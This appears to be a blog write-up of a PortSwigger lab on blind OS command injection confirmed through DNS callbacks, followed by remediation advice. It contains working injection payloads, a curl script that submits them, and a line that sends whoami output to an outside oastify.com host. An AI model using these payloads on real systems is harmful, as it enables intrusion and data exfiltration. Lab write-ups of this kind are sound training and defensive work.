---
layout: post
title: "PortSwigger: Blind OS Command Injection with Out-of-Band Interaction"
date: 2027-09-18 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, CommandInjection]
tags: [portswigger, os-command-injection, command-injection, blind, out-of-band, oast, dns, nslookup, oastify, cwe-78]
---

The feedback form on this shop pastes your **email** value into an operating-system shell command — same root cause as the [simple case](https://cwe.mitre.org/data/definitions/78.html) and the [output-redirection variant](https://cwe.mitre.org/data/definitions/78.html). But this time there is no output to read **and** no writable web directory to redirect into. The page just returns `200 {}`. So how do you prove you have code execution when you can't see anything come back? You make the server phone home — trigger a DNS lookup to a host you can watch, and the lookup itself is your proof.

## Overview

This is a blind [OS command injection](https://cwe.mitre.org/data/definitions/78.html) ([CWE-78](https://cwe.mitre.org/data/definitions/78.html)) confirmed **out-of-band** (OAST). The `email` parameter of `POST /feedback/submit` is spliced into a shell command, the command's output is discarded, and there's no timing or error oracle. The remaining channel is a network callback: inject a command that resolves an attacker-observable hostname, and a DNS hit proves the shell ran your command.

## The technique

The server builds a shell command that includes the email you submit. Two pieces make the confirmation work:

- **`||`** — the shell OR operator. We give it a bogus left side (`x`) that fails, so the shell runs the next command. The *trailing* `||` short-circuits whatever the app appended after our value, so the line returns `200` instead of erroring with `500`.
- **`nslookup`** — forces the server to perform a DNS lookup for a hostname we control. We never see the command's *output*, but we can see that the lookup *happened*.

So the payload, placed in the `email` field, is:

```
x||nslookup x.SUBDOMAIN.oastify.com||
```

You don't need Burp Suite Professional for this. Any unique `*.oastify.com` subdomain works: PortSwigger runs the authoritative DNS for `oastify.com`, logs every query, and attributes the lookup back to your lab by the source/egress IP — so the lab marks itself solved with no Collaborator polling on your side. Off-platform you'd point the lookup at your own authoritative DNS server (or an [interactsh](https://github.com/projectdiscovery/interactsh) domain) and watch its query log.

## Solving it

First grab a fresh (single-use) CSRF token and session cookie from the feedback page, then submit the injection:

```bash
csrf=$(curl -sk -c cookies.txt "https://TARGET/feedback" \
  | grep -oiE 'name="csrf" value="[^"]*"' | sed -E 's/.*value="([^"]*)".*/\1/')

curl -sk -b cookies.txt "https://TARGET/feedback/submit" \
  --data-urlencode "csrf=$csrf" \
  --data-urlencode "name=test" \
  --data-urlencode "email=x||nslookup x.SUBDOMAIN.oastify.com||" \
  --data-urlencode "subject=test" \
  --data-urlencode "message=test"
```

The response body is just:

```
{}
```

A few seconds later — once the DNS query lands and is attributed — the lab flips to **Solved**.

## Going further: data exfiltration

The same channel leaks data. Glue a command's output into the subdomain label and read it off the front of the DNS query you receive:

```
x||nslookup $(whoami).SUBDOMAIN.oastify.com||
```

## Why it worked

- The `email` value reaches a shell unsanitised, so `||` and `nslookup` are interpreted as command syntax rather than data.
- There is no in-band output and no timing/error oracle — but the backend has **network egress**, and a DNS lookup is observable from outside. The lookup arriving *is* the confirmation.
- This is the variant to reach for when the other blind techniques are unavailable: no reflected output ([simple case](https://cwe.mitre.org/data/definitions/78.html)), no writable served directory ([output redirection](https://cwe.mitre.org/data/definitions/78.html)), and you'd rather not lean on a stopwatch ([time delays](https://cwe.mitre.org/data/definitions/78.html)).

## The fix

1. **Don't call a shell.** Pass the program and its arguments as a list so the OS never re-parses your data as command syntax: `subprocess.run(["mail", "-s", "feedback", email])` — never `shell=True`.
2. **Validate input** — an email field should pass a strict validator before it goes anywhere near a command.
3. **Egress-filter the worker** so it can't make arbitrary outbound DNS/HTTP requests. That closes the out-of-band channel even if an injection slips through.
4. **Least privilege** for the process, so a confirmed RCE is contained.

Keep untrusted data and command syntax separate, and don't let a back-end process make arbitrary outbound network requests.
